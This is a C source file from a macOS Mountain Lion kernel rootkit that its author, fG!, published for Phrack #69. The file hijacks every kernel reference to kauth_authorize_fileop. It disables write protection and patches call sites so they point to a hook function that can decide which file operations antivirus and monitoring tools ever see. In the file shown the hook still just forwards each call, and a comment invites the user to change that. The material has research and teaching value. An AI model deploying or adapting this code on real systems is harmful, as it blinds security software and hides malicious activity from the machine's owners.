/*
 *   _____   _                          ___     _      _  _     _              __ _
 *  |_   _| | |_      ___      o O O   | __|   | |    | || |   (_)    _ _     / _` |
 *    | |   | ' \    / -_)    o        | _|    | |     \_, |   | |   | ' \    \__, |
 *   _|_|_  |_||_|   \___|   TS__[O]  _|_|_   _|_|_   _|__/   _|_|_  |_||_|   |___/
 * _|"""""|_|"""""|_|"""""| {======|_| """ |_|"""""|_| """"|_|"""""|_|"""""|_|"""""|
 * "`-0-0-'"`-0-0-'"`-0-0-'./o--000'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'
 *            ___      _
 *    o O O  / __|    (_)      _ _    __     _  _     ___
 *   o      | (__     | |     | '_|  / _|   | +| |   (_-<
 *  TS__[O]  \___|   _|_|_   _|_|_   \__|_   \_,_|   /__/_
 *  {======|_|"""""|_|"""""|_|"""""|_|"""""|_|"""""|_|"""""|
 * ./o--000'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'
 *
 * And now for something completely different...
 *
 * A Mountain Lion rootkit for Phrack #69!
 *
 * Copyright (c) fG!, 2012, 2013 - reverser@put.as - http://reverse.put.as
 * All rights reserved.
 *
 * av_monster_II.c
 *
 * Kauth hijacking implementation
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 * notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 * notice, this list of conditions and the following disclaimer in the
 * documentation and/or other materials provided with the distribution.
 * 3. The name of the author may not be used to endorse or promote products
 * derived from this software without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND ANY EXPRESS OR
 * IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES
 * OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.
 * IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT,
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT
 * NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
 * DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
 * THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
 * THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 *
 */

#include "av_monster_II.h"

#include <sys/param.h>
#include <sys/malloc.h>
#include <sys/dirent.h>
#include <mach-o/loader.h>
#include <sys/kauth.h>

#include "kernel_info.h"
#include "cpu_protections.h"
#include "configuration.h"
#include "hijacking_utils.h"
#include "disasm_utils.h"
#include "utlist.h"

extern struct kernel_info g_kernel_info;

char trampoline_bytes[TRAMPOLINE_SIZE];
struct xrefs *g_monster_xrefs = NULL;
struct nops  *g_monster_nops = NULL;

// our hook function
int tfc_kauth_authorize_fileop(kauth_cred_t credential, kauth_action_t action, uintptr_t arg0, uintptr_t arg1);

#pragma mark Start and stop functions

/*
 * this AV Monster II implementation redirects all references on kauth_authorize_fileop()
 * to our function that decides to send to kauth or not
 * another implementation possibility is to trampoline the function and reimplement it
 */
kern_return_t
unleash_the_monster(void)
{
    int xrefs_count = find_symbol_refs("_kauth_authorize_fileop", &g_monster_xrefs);
    if (xrefs_count < 1) return KERN_FAILURE; // bail out if there are no refs or some error happened
    // find a free nop space where we can put the pointer
    if (find_nop_space(TRAMPOLINE_SIZE, 1, &g_monster_nops) < 1) return KERN_FAILURE;
    // do the magic
    if (hijack_xrefs("_kauth_authorize_fileop", (mach_vm_address_t)tfc_kauth_authorize_fileop, g_monster_xrefs, g_monster_nops, 0))
    {
        return KERN_FAILURE;
    }
    return KERN_SUCCESS;
}

/*
 * restore the references to the original symbol and NOPs
 * and cleanup the linked lists
 */
kern_return_t
leash_the_monster(void)
{
    if(unhijack_xrefs("_kauth_authorize_fileop", g_monster_xrefs, g_monster_nops)) return KERN_FAILURE;
    // cleanup xrefs
    struct xrefs *el, *tmp;
    LL_FOREACH_SAFE(g_monster_xrefs, el, tmp)
    {
        LL_DELETE(g_monster_xrefs, el);
        _FREE(el, M_TEMP);
    }
    g_monster_xrefs = NULL;
    struct nops *eln, *tmpn;
    disable_wp();
    LL_FOREACH_SAFE(g_monster_nops, eln, tmpn)
    {
        LL_DELETE(g_monster_nops, eln);
        _FREE(eln, M_TEMP);
    }
    enable_wp();
    g_monster_nops = NULL;
    return KERN_SUCCESS;
}

#pragma The hijacked function(s)

int
tfc_kauth_authorize_fileop(kauth_cred_t credential, kauth_action_t action, uintptr_t arg0, uintptr_t arg1)
{
    // get the original function location since symbol is not KPI
    static int (*_kauth_authorize_fileop)(kauth_cred_t credential, kauth_action_t action, uintptr_t arg0, uintptr_t arg1) = NULL;
    if (_kauth_authorize_fileop == NULL) _kauth_authorize_fileop = (void*)solve_kernel_symbol(&g_kernel_info, "_kauth_authorize_fileop");
    // do whatever you want here to send or not to kauth - arg0 should have a vnode_t so we can use it
    // use kauth_authorize_fileop() implementation as reference for example
    // here it's just calling the original function so don't forget to modify this
    return _kauth_authorize_fileop(credential, action, arg0, arg1);
}

